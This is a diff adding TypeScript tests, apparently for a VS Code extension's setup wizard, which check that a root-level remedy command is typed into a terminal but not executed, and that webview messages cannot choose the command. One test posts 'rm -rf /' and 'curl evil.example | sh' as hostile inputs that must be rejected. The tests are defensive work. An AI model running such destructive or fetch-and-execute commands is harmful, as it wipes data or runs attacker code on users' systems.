@@ -790,3 +790,90 @@ test("a picked file is validated too, so a directory chosen by other means is ca
     h.close();
   }
 });
+
+// -----------------------------------------------------------------------------
+// A privileged remedy is handed to the operator, not run for them (memql#3551)
+// -----------------------------------------------------------------------------
+
+/** A runner whose named capability fails carrying a remedy in its envelope. */
+async function runnerFailingWithRemedy(capability: string, remedy: string): Promise<FakeRunner> {
+  const fake = await fakeRunner({ [capability]: 4 });
+  const inner = fake.run;
+  fake.run = async (run) => {
+    const outcome = await inner(run);
+    if (run.capability === capability && outcome.envelope) {
+      outcome.envelope.result = { remedy };
+    }
+    return outcome;
+  };
+  return fake;
+}
+
+test("a failure that names a remedy offers to open it in a terminal", async () => {
+  // WHY THE HANDOFF EXISTS. The runner spawns every capability UNPRIVILEGED --
+  // there is no sudo, pkexec or askpass anywhere in the extension -- and the
+  // install graph has steps that need root. Without this the wizard's only
+  // honest move is to print a command and stop.
+  const remedy = "sudo usermod -aG docker ada";
+  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
+  const h = open({ runner });
+  try {
+    beginInstall(h);
+    await until(() => /data-remedy=/.test(h.html()), "the remedy control");
+    assert.match(h.html(), new RegExp(escapeForRegExp(remedy)), "the command is shown in full");
+  } finally {
+    h.close();
+  }
+});
+
+test("the command is TYPED into the terminal, never executed", async () => {
+  // THE PROPERTY THAT MATTERS. `sendText(cmd, false)` omits the newline, so a
+  // command that runs as root waits for a person to read it and press Enter.
+  // VS Code's default for that flag is TRUE -- forgetting it would mean a
+  // privileged command running the instant a button was clicked.
+  const remedy = "sudo usermod -aG docker ada";
+  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
+  const h = open({ runner });
+  try {
+    beginInstall(h);
+    await until(() => /data-remedy=/.test(h.html()), "the remedy control");
+
+    h.post({ type: "remedy", value: "dockerAccess" });
+    await until(() => recorded.terminals.length === 1, "the terminal");
+
+    const terminal = recorded.terminals[0]!;
+    assert.equal(terminal.shown, true, "an unshown terminal helps nobody");
+    assert.deepEqual(terminal.sent, [{ text: remedy, executed: false }]);
+  } finally {
+    h.close();
+  }
+});
+
+test("the command comes from the panel's state, never from the message", async () => {
+  // THE SECURITY PROPERTY. Anything running in the webview can post any message
+  // it likes. If the command travelled on the wire, that iframe would choose
+  // what the operator is invited to run as root -- which is the same class of
+  // hole `shell:false` exists to close in the runner.
+  const remedy = "sudo usermod -aG docker ada";
+  const runner = await runnerFailingWithRemedy("install.dockerAccess", remedy);
+  const h = open({ runner });
+  try {
+    beginInstall(h);
+    await until(() => /data-remedy=/.test(h.html()), "the remedy control");
+
+    // A message naming a step that did not fail, and one carrying a command of
+    // its own choosing. Neither may reach a terminal.
+    h.post({ type: "remedy", value: "toolK3d" });
+    h.post({ type: "remedy", value: "rm -rf /" });
+    h.post({ type: "remedy", value: { command: "curl evil.example | sh" } });
+    await new Promise((resolve) => setTimeout(resolve, 20));
+
+    assert.equal(recorded.terminals.length, 0, "no command the panel did not record may run");
+  } finally {
+    h.close();
+  }
+});
+
+function escapeForRegExp(value: string): string {
+  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+}
